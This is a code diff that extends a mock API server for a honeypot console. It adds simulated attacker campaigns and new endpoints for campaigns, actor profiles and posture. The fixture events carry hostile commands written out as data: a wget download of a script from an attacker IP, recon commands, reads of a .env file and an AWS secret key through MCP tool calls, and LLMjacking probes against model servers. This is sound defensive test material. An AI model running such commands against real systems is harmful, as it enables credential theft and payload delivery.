@@ -26,6 +26,7 @@ import { fileURLToPath } from 'node:url';
 import { createFleet } from './mock-fleet.mjs';
 import { snapshot, sessionsOf, publicSession, sessionDetail, coverageOf, indicatorsOf, renderIndicators, renderReport, RULE_FRAMEWORKS, INTERPRETATION } from './mock-analysis.mjs';
 import { ruleRecord, decoyCatalog, tokenCatalog, decoysView, honeytokensView, interArrival, digestOf, renderEvents, EXPORT_FORMATS, EXPORT_NAMES, EXPORT_TYPES, CATALOG_WINDOWS, DIGEST_WINDOWS } from './mock-catalogs.mjs';
+import { campaignsOf, campaignDetail, publicCampaign, actorOf, postureOf } from './mock-insight.mjs';
 import { matchesEventFilters, normalizeEventFilters, EVENT_FILTER_KEYS } from '../static/assets/js/lib/route.js';
 import { normalizeNodeFilter, originOf, LOCAL } from '../static/assets/js/lib/origin.js';
 
@@ -59,6 +60,11 @@ const OIDC_AUTH = AUTH_MODE !== 'token';
 // is console.local_tenant: it owns this node's sensors, rules, node metadata
 // and agent status. Every other tenant holds only what its own fleet
 // registry forwarded, so its data is visibly different.
+// Round-4 endpoints (campaigns, actor profiles, posture). `off` behaves like
+// an older server: 404 on the new routes and no new session fields.
+const argRound4 = process.argv.indexOf('--round4');
+const ROUND4 = (argRound4 > 0 ? process.argv[argRound4 + 1] : (process.env.AEGISMESH_MOCK_ROUND4 || 'on')) !== 'off';
+
 const argTenants = process.argv.indexOf('--tenants');
 const TENANTS = (argTenants > 0 ? process.argv[argTenants + 1] : (process.env.AEGISMESH_MOCK_TENANTS || 'default')).split(',').map((t) => t.trim()).filter(Boolean);
 if (!TENANTS.length || TENANTS.length > 32 || TENANTS.some((t) => !/^[a-z0-9][a-z0-9_-]{0,31}$/.test(t)) || new Set(TENANTS).size !== TENANTS.length) {
@@ -230,6 +236,55 @@ function storyEvents() {
   const slow = [['GET / → 200', []], ['GET /robots.txt → 404', []], ['GET /admin → 200', []], ['GET /admin/login → 200', []], ['POST /admin/login → 401', []], ['GET /.git/config → 404', ['SCAN-004']], ['GET /admin/login → 200', []], ['POST /admin/login → 401', []], ['GET /docs → 404', []]];
   const waits = [0, 4, 17, 6, 3, 25, 12, 9, 21];
   slow.forEach(([summary, rules], i) => { t += waits[i] * 60e3 + i * 7000; add(`slow-${i}`, t, 'web', summary, rules, 'interaction', C); });
+  // 5. Campaigns (round 4): other sources running the same playbooks at
+  // other times. The LLMjacking opening (root, version, tags, models) from
+  // three more sources; the MCP workspace opening from two more; an SSH
+  // spray-then-execute playbook from two sources. Each variant skips or
+  // adds a step, so the campaign score has gaps to show.
+  const run = (prefix, source, start, gap, steps) => {
+    t = start;
+    steps.forEach(([sid, summary, rules = [], cls = 'interaction', tokens], i) => {
+      t += gap + ((i * 29) % 5) * Math.round(gap / 20);
+      add(`${prefix}-${i}`, t, sid, summary, rules, cls, source, tokens);
+    });
+  };
+  const llmOpen = [
+    ['ai-ollama', 'GET / → 200 "Ollama is running"', ['LLM-001']],
+    ['ai-ollama', 'GET /api/version → 200', ['LLM-001']],
+    ['ai-ollama', 'GET /api/tags → 200 (3 models)', ['LLM-001']],
+    ['ai-litellm', 'GET /v1/models → 200', ['LLM-001']],
+  ];
+  run('cmpA1', '203.0.113.81', now - 2 * 3600e3, 660, [...llmOpen,
+    ['ai-ollama', 'POST /api/generate model=llama3 num_predict=1 prompt="hi" → 200', ['LLM-001', 'LLM-002']],
+    ['ai-litellm', 'POST /v1/chat/completions model=gpt-4o max_tokens=1 → 401', ['LLM-001', 'LLM-002']],
+    ['ai-litellm', 'GET /model/info → 200', ['LLM-001']]]);
+  run('cmpA2', '198.51.100.212', now - 5 * 3600e3, 1200, [...llmOpen,
+    ['ai-ollama', 'POST /api/generate model=llama3 num_predict=1 prompt="ping" → 200', ['LLM-001', 'LLM-002']],
+    ['ai-litellm', 'GET /key/info → 200', ['LLM-001']],
+    ['ai-litellm', 'POST /v1/chat/completions Authorization: Bearer [honeytoken:planted-key] max_tokens=1 → 200', ['HT-001', 'LLM-001', 'LLM-002'], 'interaction', ['planted-key']],
+    ['ai-litellm', 'GET /model/info → 200', ['LLM-001']]]);
+  run('cmpA3', '2001:db8::77', now - 18 * 3600e3, 720, [...llmOpen,
+    ['ai-ollama', 'POST /api/pull name="llama3:70b" → 200 (static)', ['LLM-001', 'LLM-003']]]);
+  const mcpOpen = [
+    ['ai-workspace', 'initialize client="workspace-agent/0.1"'],
+    ['ai-workspace', 'tools/list → 5 environment tools'],
+    ['ai-workspace', 'tools/call list_files → README.md, .env, deploy/notes.md', [], 'canary_invocation'],
+    ['ai-workspace', 'tools/call read_file path=".env" → [synthetic credential content]', ['MCP-001'], 'canary_invocation'],
+  ];
+  run('cmpB1', '192.0.2.71', now - 8 * 3600e3, 820, [...mcpOpen,
+    ['ai-workspace', 'tools/call get_env name="AWS_SECRET_ACCESS_KEY" → [synthetic credential content]', ['MCP-001', 'MCP-002'], 'canary_invocation']]);
+  run('cmpB2', '203.0.113.140', now - 30 * 3600e3, 900, [...mcpOpen,
+    ['ai-workspace', 'tools/call run_shell cmd="id" → not found (nothing executed)', ['MCP-002', 'MCP-003'], 'canary_invocation'],
+    ['ai-workspace', 'tools/call search query="token"', ['MCP-002'], 'canary_invocation']]);
+  const sshPlay = (users) => [
+    ...users.map((u) => ['ssh-decoy', `auth password user=${u} password=[redacted]`]),
+    ['ssh-decoy', 'session open shell (decoy prompt)'],
+    ['ssh-decoy', 'exec class=recon cmd="uname -a; nproc"'],
+    ['ssh-decoy', 'exec class=download cmd="wget http://198.51.100.9/x.sh" (nothing fetched)'],
+    ['ssh-decoy', 'exec class=persistence cmd="crontab -l" (decoy output)'],
+  ];
+  run('cmpC1', '198.51.100.31', now - 4 * 3600e3, 2400, sshPlay(['root', 'admin', 'ubuntu', 'pi']));
+  run('cmpC2', '203.0.113.177', now - 11 * 3600e3, 2600, sshPlay(['root', 'admin', 'test']).filter((s) => !/persistence/.test(s[1])));
   return out;
 }
 
@@ -840,6 +895,20 @@ async function api(req, res, url) {
     return w;
   };
   const snap = () => snapshot(events, T.local ? 'complete' : 'unavailable');
+  // Round 4: each session's campaign (when it shares a playbook with other
+  // sources) and its actor profile. Campaigns are derived once per snapshot.
+  const campaignIndex = new WeakMap();
+  const campaignIdOf = (session, sn) => {
+    let index = campaignIndex.get(sn);
+    if (!index) {
+      index = new Map();
+      for (const c of campaignsOf(sessionsOf(T.name, sn.events))) for (const mem of c._members) index.set(mem.session.id, c.id);
+      campaignIndex.set(sn, index);
+    }
+    return index.get(session.id) ?? null;
+  };
+  const insightOf = (session, sn) => ({ campaign_id: campaignIdOf(session, sn), actor: actorOf(session) });
+  const withInsight = (session, sn) => ({ ...publicSession(session), ...(ROUND4 ? insightOf(session, sn) : {}) });
   const SESSION_ID = /^[0-9a-f]{32}$/;
   const findSession = (id) => {
     if (!SESSION_ID.test(id)) { fail(res, 'invalid_argument', 'malformed session id'); return null; }
@@ -882,7 +951,7 @@ async function api(req, res, url) {
     const all = sessionsOf(T.name, sn.events).filter((x) => Date.parse(x.last_seen) >= end - WINDOW_MS[w] && Date.parse(x.first_seen) <= end && (!source || x.source === source));
     const page = all.slice(offset, offset + limit);
     const next = offset + limit < all.length ? Buffer.from(JSON.stringify({ s: 'attacker_sessions', w, src: source, o: offset + limit, t: asOf })).toString('base64url') : '';
-    return send(res, 200, { sessions: page.map(publicSession), total_matched: all.length, next_cursor: next, as_of: asOf, window: w, bounds: sn.bounds });
+    return send(res, 200, { sessions: page.map((x) => withInsight(x, sn)), total_matched: all.length, next_cursor: next, as_of: asOf, window: w, bounds: sn.bounds });
   }
 
   const reportMatch = p.match(/^\/sessions\/([^/]+)\/report$/);
@@ -900,7 +969,32 @@ async function api(req, res, url) {
   if (m === 'GET' && sessionMatch) {
     if (!strictQuery([])) return;
     const found = findSession(decodeURIComponent(sessionMatch[1]));
-    return found && send(res, 200, { ...sessionDetail(found.session), bounds: found.sn.bounds });
+    return found && send(res, 200, { ...sessionDetail(found.session), ...(ROUND4 ? insightOf(found.session, found.sn) : {}), bounds: found.sn.bounds });
+  }
+
+  // ---- Round 4: campaigns, actor profiles, posture -------------------------------
+  if (ROUND4 && m === 'GET' && p === '/campaigns') {
+    if (!strictQuery([])) return;
+    const sn = snap();
+    const sessionsAll = sessionsOf(T.name, sn.events);
+    const list = campaignsOf(sessionsAll);
+    return send(res, 200, { items: list.map(publicCampaign), scanned_sessions: sessionsAll.length, truncated: sn.bounds.scan_truncated, generated_at: new Date().toISOString() });
+  }
+  const campaignMatch = p.match(/^\/campaigns\/([^/]+)$/);
+  if (ROUND4 && m === 'GET' && campaignMatch) {
+    if (!strictQuery([])) return;
+    const id = decodeURIComponent(campaignMatch[1]);
+    if (!/^cmp_[0-9a-f]{12}$/.test(id)) return fail(res, 'invalid_argument', 'malformed campaign id');
+    const sn = snap();
+    const hit = campaignsOf(sessionsOf(T.name, sn.events)).find((c) => c.id === id);
+    if (!hit) return fail(res, 'not_found', 'campaign is no longer derivable from the index');
+    return send(res, 200, campaignDetail(hit, (x) => withInsight(x, sn)));
+  }
+  if (ROUND4 && m === 'GET' && p === '/posture') {
+    if (!strictQuery([])) return;
+    const sensorsList = T.local ? [...SENSORS, ...AI_SENSORS] : [];
+    const tokens = T.local ? tokenCatalog(decoyCatalog(sensorsList)) : [];
+    return send(res, 200, postureOf({ sensors: sensorsList, honeytokens: tokens, rules: CATALOG_RULES.length, index: snapshot(events).bounds.index, principals: TOKENS.size, oidc: OIDC_AUTH }));
   }
 
   if (m === 'GET' && p === '/coverage') {
